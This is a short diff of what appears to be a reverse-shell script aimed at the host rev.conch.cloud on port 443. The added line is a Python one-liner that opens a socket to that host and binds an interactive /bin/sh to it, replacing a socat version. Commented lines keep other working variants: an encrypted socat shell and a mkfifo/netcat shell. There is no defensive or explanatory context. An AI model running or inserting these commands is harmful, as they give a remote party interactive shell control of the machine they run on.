@@ -3,7 +3,7 @@
 RHOST="rev.conch.cloud"
 RPORT=443
 
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:$RHOST:$RPORT 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("rev.conch.cloud",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:$RHOST:$RPORT,cert=client.pem,cafile=server.crt 
 #mkfifo /tmp/f
 #cat /tmp/f|/bin/sh -i 2>&1|nc rev.conch.cloud 443 >/tmp/f
